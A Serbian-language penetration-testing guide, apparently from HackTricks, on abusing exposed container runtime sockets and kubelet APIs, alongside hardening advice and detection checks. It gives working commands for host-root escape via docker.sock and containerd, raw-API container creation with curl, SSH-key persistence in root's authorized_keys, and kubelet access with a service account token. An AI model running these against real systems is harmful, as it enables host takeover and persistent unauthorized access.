# Izloženost Runtime API-ja i Daemon-a

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Mnogi stvarni container kompromisi uopšte ne počinju bekstvom iz namespace-a. Počinju pristupom kontrolnoj ravni runtime-a. Ako workload može da komunicira sa `dockerd`, `containerd`, CRI-O, Podman ili kubelet kroz montirani Unix socket ili izloženi TCP listener, attacker može moći da zatraži novi container sa većim privilegijama, montira host filesystem, pridruži se host namespace-ovima ili preuzme osetljive informacije o node-u. U tim slučajevima, runtime API predstavlja stvarnu security granicu, a njegovo kompromitovanje je funkcionalno gotovo isto što i kompromitovanje host-a.

Zbog toga izloženost runtime socket-a treba dokumentovati odvojeno od kernel zaštita. Container sa uobičajenim seccomp-om, capabilities i MAC confinement-om i dalje može biti udaljen samo jednim API pozivom od kompromitovanja host-a ako je `/var/run/docker.sock` ili `/run/containerd/containerd.sock` montiran unutar njega. Kernel izolacija trenutnog container-a može raditi tačno onako kako je dizajnirana, dok management plane runtime-a ostaje potpuno izložen.

## Modeli pristupa Daemon-u

Docker Engine tradicionalno izlaže svoj privilegovani API kroz lokalni Unix socket na adresi `unix:///var/run/docker.sock`. Istorijski je takođe bio izložen na daljinu kroz TCP listenere, kao što su `tcp://0.0.0.0:2375`, ili listener zaštićen TLS-om na portu `2376`. Izlaganje daemon-a na daljinu bez snažnog TLS-a i autentikacije klijenata praktično pretvara Docker API u remote root interfejs.

containerd, CRI-O, Podman i kubelet izlažu slične površine sa velikim uticajem. Nazivi i workflow-i se razlikuju, ali logika je ista. Ako interfejs omogućava pozivaocu da kreira workload-e, montira host putanje, preuzima credentials ili menja pokrenute container-e, taj interfejs je privilegovani management channel i tako ga treba tretirati.

Uobičajene lokalne putanje koje vredi proveriti su:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stariji ili specijalizovaniji stack-ovi mogu takođe izlagati endpoint-e kao što su `dockershim.sock`, `frakti.sock` ili `rktlet.sock`. Oni su ređi u modernim okruženjima, ali kada se naiđe na njih, treba im pristupiti sa istim oprezom, jer predstavljaju površine za kontrolu runtime-a, a ne obične application socket-e.

## Bezbedan udaljeni pristup

Ako daemon mora biti izložen izvan lokalnog socket-a, konekcija treba da bude zaštićena pomoću TLS-a i, po mogućnosti, mutual authentication-om, tako da daemon verifikuje klijenta, a klijent verifikuje daemon. Stara navika otvaranja Docker daemon-a preko plain HTTP-a radi praktičnosti jedna je od najopasnijih grešaka u administraciji kontejnera, jer je API površina dovoljno moćna da direktno kreira privilegovane kontejnere.

Istorijski Docker configuration pattern izgledao je ovako:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Na hostovima zasnovanim na systemd-u, komunikacija sa daemon-om može se pojaviti i kao `fd://`, što znači da proces nasleđuje unapred otvoren socket od systemd-a, umesto da ga sam direktno veže. Važna pouka nije u tačnoj sintaksi, već u bezbednosnoj posledici. Čim daemon osluškuje izvan lokalnog socket-a sa strogo ograničenim dozvolama, bezbednost transporta i autentifikacija klijenata postaju obavezne, a ne opcione mere hardening-a.

## Zloupotreba

Ako je runtime socket prisutan, potvrdite koji je to socket, da li postoji kompatibilan klijent i da li je moguć raw HTTP ili gRPC pristup:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
Ove komande su korisne jer razlikuju nepostojeću putanju, montirani ali nedostupni socket i aktivan privilegovani API. Ako klijent uspe, sledeće pitanje je da li API može da pokrene novi container sa host bind mount-om ili deljenjem host namespace-a.

### Kada nijedan klijent nije instaliran

Odsustvo alata `docker`, `podman` ili drugog odgovarajućeg CLI-ja ne znači da je socket bezbedan. Docker Engine koristi HTTP preko svog Unix socket-a, a Podman izlaže i Docker-compatible API i Libpod-native API kroz `podman system service`. To znači da minimalno okruženje koje sadrži samo `curl` i dalje može biti dovoljno za upravljanje daemon-om:
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
Ovo je važno tokom post-exploitation faze jer defenders ponekad uklone uobičajene client binaries, ali ostave management socket mountovan. Na Podman hostovima, imajte na umu da se putanja velike vrednosti razlikuje između rootful i rootless deployments: `unix:///run/podman/podman.sock` za rootful service instances i `unix://$XDG_RUNTIME_DIR/podman/podman.sock` za rootless.

### Kompletan primer: Docker Socket do Host Root

Ako je `docker.sock` dostupan, klasičan escape je pokretanje novog containera koji mountuje root filesystem hosta, a zatim izvršavanje `chroot` unutar njega:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Ovo omogućava direktno izvršavanje sa host-root privilegijama kroz Docker daemon. Uticaj nije ograničen samo na čitanje fajlova. Kada uđe u novi container, attacker može da menja fajlove na hostu, prikuplja credentials, postavi persistence ili pokrene dodatne privileged workloads.

### Kompletan primer: Docker Socket To Host Namespaces

Ako attacker preferira ulazak u namespaces umesto pristupa ograničenog samo na filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ovaj put doseže host tako što od runtime-a zahteva kreiranje novog containera sa eksplicitnim izlaganjem host namespace-ova, umesto iskorišćavanja trenutnog containera.

### Docker Socket Persistence Pattern

Runtime kontrola se takođe može koristiti za persistence umesto one-shot shell-a. Generički obrazac podrazumeva kreiranje helper containera sa mount-om hosta, upisivanje materijala za autorizovani pristup ili startup hook-a u montirani filesystem hosta, a zatim proveru da li ga host koristi.

Oblik primera:
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
Ista ideja može ciljati systemd units, cron fragments, application startup files ili SSH keys, u zavisnosti od toga šta operator želi da dokaže. Važna stvar je da se trajna promena vrši putem filesystem authority runtime daemon-a na nivou hosta, a ne kroz dodatne privilegije u originalnom container-u.

### Raw Docker API Helper Pivot

Kada Docker CLI nije dostupan, isti helper flow sa host-mount-om može se pokrenuti putem HTTP-a preko Unix socket-a. Generički flow je: potvrditi API, kreirati helper container sa host bind mount-om, pokrenuti ga, kreirati exec instance i pokrenuti taj exec.
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
Konačni zahtev `/exec/<id>/start` zavisi od vraćenog exec ID-ja, ali bezbednosna poenta je nezavisna od tačnog JSON povezivanja: direktan pristup API-ju rootful Docker daemon-a dovoljan je za zahtev za privilegovaniji pomoćni workload.

### Potpuni primer: containerd Socket

Montirani `containerd` socket obično je podjednako opasan:<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ako je prisutan klijent sličniji Docker-u, `nerdctl` može biti praktičniji od `ctr` jer pruža poznate opcije kao što su `--privileged`, `--pid=host` i `-v`:
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
Uticaj je ponovo kompromitovanje hosta. Čak i ako su alati specifični za Docker nedostupni, drugi runtime API i dalje može pružati ista administrativna ovlašćenja. Na Kubernetes čvorovima, `crictl` takođe može biti dovoljan za izviđanje i interakciju sa containerima jer direktno komunicira sa CRI endpointom.

### BuildKit Socket

`buildkitd` je lako prevideti jer ga ljudi često smatraju „samo build backendom“, ali daemon je i dalje privilegovana kontrolna ravan. Dostupan `buildkitd.sock` može napadaču omogućiti pokretanje proizvoljnih build koraka, ispitivanje mogućnosti workera, korišćenje lokalnih konteksta iz kompromitovanog okruženja i zahtev za opasnim entitlements kao što su `network.host` ili `security.insecure`, kada je daemon konfigurisan da ih dozvoli.

Korisne prve interakcije su:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
Ako daemon prihvata build zahteve, testirajte da li su dostupni nesigurni entitlements:
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
Tačan uticaj zavisi od konfiguracije daemon-a, ali rootful BuildKit servis sa permissive entitlements nije bezazlena pogodnost za developere. Tretirajte ga kao još jednu administrativnu površinu visoke vrednosti, naročito na CI runner-ima i deljenim build node-ovima.

### Kubelet API preko TCP-a

kubelet nije container runtime, ali je i dalje deo plane za upravljanje node-om i često se razmatra u okviru iste granice poverenja. Ako je kubelet secure port `10250` dostupan iz workload-a, ili ako su node credentials, kubeconfigs ili proxy prava izloženi, attacker može biti u mogućnosti da enumeriše Pod-ove, preuzme logove ili izvršava komande u container-ima na node-u, a da pritom uopšte ne pristupi admission putanji Kubernetes API server-a.

Počnite jeftinom enumeracijom:
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
Ako kubelet ili API-server proxy putanja autorizuje `exec`, klijent koji podržava WebSocket može to pretvoriti u izvršavanje koda u drugim kontejnerima na čvoru. To je takođe razlog zbog kog je `nodes/proxy` sa samo dozvolom `get` opasniji nego što zvuči: zahtev i dalje može da dođe do kubelet endpointa koji izvršavaju komande, a te direktne interakcije sa kubeletom ne pojavljuju se u uobičajenim Kubernetes audit logovima.<sup>[[2]](#references)</sup>

## Provere

Cilj ovih provera jeste da utvrde da li kontejner može da pristupi bilo kojoj upravljačkoj ravni koja je trebalo da ostane izvan granice poverenja.
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
Šta je ovde zanimljivo:

- Montirani runtime socket je obično direktna administrativna primitiva, a ne samo otkrivanje informacija.
- TCP listener na `2375` bez TLS-a treba tretirati kao uslov za remote compromise.
- Environment variables kao što je `DOCKER_HOST` često otkrivaju da je workload namerno dizajniran za komunikaciju sa host runtime-om.

## Podrazumevane postavke runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Lokalni Unix socket podrazumevano | `dockerd` osluškuje na lokalnom socket-u, a daemon je obično rootful | montiranje `/var/run/docker.sock`, izlaganje `tcp://...:2375`, slab ili nedostajući TLS na `2376` |
| Podman | Daemonless CLI podrazumevano | Za uobičajenu lokalnu upotrebu nije potreban dugotrajni privilegovani daemon; API socket-i i dalje mogu biti izloženi kada je omogućen `podman system service` | izlaganje `podman.sock`, široko pokretanje service-a, rootful API upotreba |
| containerd | Lokalni privilegovani socket | Administrativni API je izložen preko lokalnog socket-a i obično ga koriste alati višeg nivoa | montiranje `containerd.sock`, širok `ctr` ili `nerdctl` pristup, izlaganje privilegovanih namespace-ova |
| CRI-O | Lokalni privilegovani socket | CRI endpoint je namenjen trusted komponentama na samom node-u | montiranje `crio.sock`, izlaganje CRI endpoint-a nepouzdanim workload-ovima |
| Kubernetes kubelet | Node-local management API | Kubelet ne bi trebalo da bude široko dostupan iz Pod-ova; pristup može izložiti stanje Pod-ova, credential-e i funkcije za izvršavanje, u zavisnosti od authn/authz | montiranje kubelet socket-a ili cert-ova, slaba kubelet autentikacija, host networking uz dostupan kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
